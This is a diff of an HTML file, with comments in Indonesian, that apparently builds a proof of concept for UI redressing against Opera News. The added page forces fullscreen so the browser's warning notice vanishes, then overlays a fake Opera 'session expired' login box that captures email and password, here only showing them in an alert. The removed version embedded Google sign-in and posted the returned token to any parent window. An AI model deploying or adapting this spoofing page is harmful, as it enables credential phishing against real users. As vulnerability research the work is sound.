@@ -1,25 +1,52 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>GIS Target</title>
+    <title>PoC UI Redressing Opera News</title>
+    <style>
+        /* Desain UI palsu yang mirip persis dengan komponen asli Opera / Android */
+        #fake-ui {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 99999;
+            color: white; text-align: center; font-family: sans-serif;
+            padding-top: 20%;
+        }
+        .login-box { background: #fff; color:#000; width: 80%; margin: 0 auto; padding: 20px; border-radius: 8px; }
+    </style>
 </head>
 <body>
-    <div id="g_id_onload"
-        data-client_id="823496596253-uptuk5vf4ms9tqcclllhntg0nvgrijj2.apps.googleusercontent.com"
-        data-context="signin"
-        data-ux_mode="popup"
-        data-callback="callback"
-        data-auto_select="true"
-        data-itp_support="true"
-        style="position: absolute; top: 0px; left: 0px; width: 300px; height: 100px; z-index: 1001;">
+
+    <button onclick="picuFullscreen()">Baca Artikel Lengkap (Trigger)</button>
+
+    <div id="fake-ui">
+        <div class="login-box">
+            <h3>Sesi Opera News Berakhir</h3>
+            <p>Silakan login kembali untuk melanjutkan membaca.</p>
+            <input type="text" placeholder="Email/Username" id="user"><br><br>
+            <input type="password" placeholder="Password" id="pass"><br><br>
+            <button onclick="curiData()">Masuk</button>
+        </div>
     </div>
+
     <script>
-        function callback(e) {
-            // Mengirim data JWT ke jendela utama (index.html)
-            parent.postMessage(e, "*");
+        function picuFullscreen() {
+            let elem = document.documentElement;
+            if (elem.requestFullscreen) { elem.requestFullscreen(); }
+            
+            // Trik lu: Saat masuk fullscreen, toast absen. 
+            // Kita langsung overlap dengan UI palsu setelah jeda sekian milidetik.
+            setTimeout(function() {
+                document.getElementById('fake-ui').style.display = 'block';
+            }, 500);
+        }
+
+        function curiData() {
+            let u = document.getElementById('user').value;
+            let p = document.getElementById('pass').value;
+            alert('Data sensitif berhasil dicuri!\nUser: ' + u + '\nPass: ' + p);
         }
     </script>
-    <script src="https://accounts.google.com/gsi/client" async></script>
 </body>
 </html>
